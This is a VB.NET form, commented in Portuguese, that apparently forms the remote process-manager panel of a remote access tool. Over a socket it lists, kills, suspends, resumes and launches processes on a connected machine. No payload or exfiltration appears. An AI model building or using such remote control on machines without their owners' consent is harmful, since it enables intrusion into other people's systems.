Imports System.ComponentModel
Imports System.IO
Imports System
Imports System.Windows.Forms.ListView
Imports System.Diagnostics
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Environment
Imports System.Windows
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports System.Text
Imports System.Windows.Forms.MessageBox 'para manter todas as messagebox em superior ou forme na hora de ser exebidas

'coded Py Pjoao1578
'v6
Public Class Form3
#Region "process"
    Dim s As String = "ProcessSplit" 'senha
    Dim ss As String = "GetProcesses" 'senha
    Dim yy As String = "||" 'senha yy =  "||"
    Public sock As Integer
#End Region

    Private Sub Form3_Closed(sender As Object, e As EventArgs) Handles Me.Closed
        Me.ListView1.Items.Clear() 'limpa lista
    End Sub

    Private Sub Form3_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Me.ListView1.Items.Clear() 'limpa lista
    End Sub

    Private Sub UpdeterToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdeterToolStripMenuItem.Click
        Me.ListView1.Items.Clear() 'limpa lista
        Form1.s.Send(sock, ss) 'atualizar processos
    End Sub

    Private Sub Form3_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.PictureBox3.Image = Me.PictureBox1.Image 'imagem off
        Me.PictureBox3.BackColor = Color.White 'color branco
        Me.ListView1.Items.Clear() 'limpa lista
        Form1.s.Send(sock, ss) 'atualizar processos
    End Sub

    Private Sub RestoreProcessoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestoreProcessoToolStripMenuItem.Click
        'descongelar processo
        Dim allprocess As String = ""
        For Each item As ListViewItem In Me.ListView1.SelectedItems
            allprocess += (item.Text & s)
        Next
        Form1.s.Send(sock, "descongelar" & yy & allprocess)
        Me.ListView1.Items.Clear()
        Form1.s.Send(sock, ss) 'atualizar processos
    End Sub

    Private Sub SuspendiProcessoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SuspendiProcessoToolStripMenuItem.Click
        'congelar processo
        Dim allprocess As String = ""
        For Each item As ListViewItem In Me.ListView1.SelectedItems
            allprocess += (item.Text & s)
        Next
        Form1.s.Send(sock, "congelar" & yy & allprocess)
        Me.ListView1.Items.Clear()
        Form1.s.Send(sock, ss) 'atualizar processos
    End Sub

    Private Sub NormalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NormalToolStripMenuItem.Click
        'kill processo normal
        Dim allprocess As String = ""
        For Each item As ListViewItem In ListView1.SelectedItems
            allprocess += (item.Text & s)
        Next
        Form1.s.Send(Me.sock, "KillProcess" & yy & allprocess)
        Me.ListView1.Items.Clear() 'limpar lista de processos
        Form1.s.Send(sock, ss) 'atualizar processos
    End Sub

    Private Sub CmdToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CmdToolStripMenuItem.Click
        'kill processo cmd
        Dim allprocess As String = ""
        For Each item As ListViewItem In Me.ListView1.SelectedItems
            allprocess += (item.Text & s)
        Next
        Form1.s.Send(Me.sock, "killprocesscmd" & yy & allprocess)
        Me.ListView1.Items.Clear() 'limpar lista de processos
        Form1.s.Send(sock, ss) 'atualizar processos
    End Sub

    Private Sub RestoreToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestoreToolStripMenuItem.Click
        'restore explorer.exe
        For Each item As ListViewItem In Me.ListView1.SelectedItems
            Form1.s.Send(sock, "openur2" & yy & "explorer")
        Next
    End Sub

    Private Sub StartProcessNameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartProcessNameToolStripMenuItem.Click
        'process start
        For Each item As ListViewItem In Me.ListView1.SelectedItems
            Dim arquivo As String = InputBox("Enter Name/Caminho", "Iniciar", "Explorer")
            If arquivo = "" Then
                MessageBox.Show("   O Processo Não Serra Iniciado", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem  
            Else
                Form1.s.Send(sock, "openur2" & yy & arquivo)
            End If
        Next
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick 'interval 6000 padrao 
        Me.ListView1.Items.Clear() 'limpa lista
        Form1.s.Send(sock, ss) 'atualizar processos
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If Me.CheckBox1.Checked = True Then
            Me.PictureBox3.Image = Me.PictureBox2.Image 'imagem on
            Me.Timer1.Interval = Me.NumericUpDown1.Value 'mude interval de timer1
            Me.Timer1.Start()
            Me.Timer2.Start() 'start ToolStripProgressBar1
        Else
            Me.PictureBox3.Image = Me.PictureBox1.Image 'imagem off
            Me.Timer1.Stop() 'false stop
            Me.Timer2.Stop()
            Me.Timer3.Stop()
            Me.Timer4.Stop()
            Me.ToolStripProgressBar1.Value = 0 '%
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick 'interval 400
        Me.ToolStripProgressBar1.Value = 50 '%
        Me.Timer3.Start()
        Me.Timer2.Stop()
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick 'interval 450
        Me.ToolStripProgressBar1.Value = 100 '%
        Me.Timer4.Start()
        Me.Timer3.Stop()
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick 'interval 500
        Me.ToolStripProgressBar1.Value = 0 '%
        Me.Timer4.Stop()
        Me.Timer2.Start()
    End Sub

    Private Sub ProcessStartToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ProcessStartToolStripMenuItem1.Click
        'copy name process
        Try
            My.Computer.Clipboard.SetText(Me.ListView1.FocusedItem.SubItems(0).Text.ToString)
        Catch ex As Exception
        End Try
        MessageBox.Show("Process Name Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub ProcessKillNormalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProcessKillNormalToolStripMenuItem.Click
        'copy ID
        Try
            My.Computer.Clipboard.SetText(Me.ListView1.FocusedItem.SubItems(2).Text.ToString)
        Catch ex As Exception
        End Try
        MessageBox.Show("ID Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub CopyUserNameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyUserNameToolStripMenuItem.Click
        'copy user namer
        Try
            My.Computer.Clipboard.SetText(Me.ListView1.FocusedItem.SubItems(1).Text.ToString)
        Catch ex As Exception
        End Try
        MessageBox.Show("   User Name Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub CopyLocalArquivoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyLocalArquivoToolStripMenuItem.Click
        'copy Local 
        Try
            My.Computer.Clipboard.SetText(Me.ListView1.FocusedItem.SubItems(4).Text.ToString)
        Catch ex As Exception
        End Try
        MessageBox.Show("   Local Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub
End Class